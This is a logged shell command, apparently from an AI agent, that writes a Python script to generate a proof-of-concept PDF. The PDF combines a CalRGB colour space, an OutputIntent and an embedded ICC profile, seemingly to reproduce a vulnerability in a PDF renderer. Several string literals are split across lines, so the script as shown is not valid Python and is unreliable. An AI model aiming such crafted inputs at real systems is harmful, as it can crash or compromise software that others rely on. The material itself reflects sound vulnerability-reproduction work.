Running command: cd /workspace && cat > /tmp/gen_pdf.py <<'PY'
import zlib, pathlib
icc = pathlib.Path('/workspace/repo-vul/work-vul/share/color/icc/srgb.icc')
if not icc.exists():
    # use lcms test profile if any
    matches=list(pathlib.Path('/workspace/repo-vul').rglob('*.icc'))
    print(matches[:10])
    icc=matches[0]
iccdata=icc.read_bytes()
objs=[]
def add(s):
    objs.append(s if isinstance(s,bytes) else s.encode('latin1'))
# 1 catalog with output intent
add('1 0 obj
<< /Type /Catalog /Pages 2 0 R /OutputIntents [ << /Type /OutputIntent /S /GTS_PDFA1 /DestOutputProfile 5 0 R >> ] >>
endobj
')
add('2 0 obj
<< /Type /Pages /Count 1 /Kids [3 0 R] >>
endobj
')
add('3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources << /ColorSpace << /CS1 [ /CalRGB << /WhitePoint [0.9505 1 1.089] >> ] >> >> /Contents 4 0 R >>
endobj
')
stream=b'q
/CS1 cs
0.2 0.3 0.4 sc
0 0 100 100 re f
Q
'
add(f'4 0 obj
<< /Length {len(stream)} >>
stream
'.encode()+stream+b'endstream
endobj
')
add(f'5 0 obj
<< /N 3 /Length {len(iccdata)} >>
stream
'.encode()+iccdata+b'
endstream
endobj
')
out=b'%PDF-1.4
%\xe2\xe3\xcf\xd3
'
off=[0]
for ob in objs:
    off.append(len(out)); out+=ob
xref=len(out)
out+=f'xref
0 {len(objs)+1}
0000000000 65535 f 
'.encode()
for o in off[1:]: out+=f'{o:010d} 00000 n 
'.encode()
out+=f'trailer
<< /Size {len(objs)+1} /Root 1 0 R >>
startxref
{xref}
%%EOF
'.encode()
pathlib.Path('/workspace/poc_calrgb_outputintent.pdf').write_bytes(out)
print('/workspace/poc_calrgb_outputintent.pdf',len(out),icc)
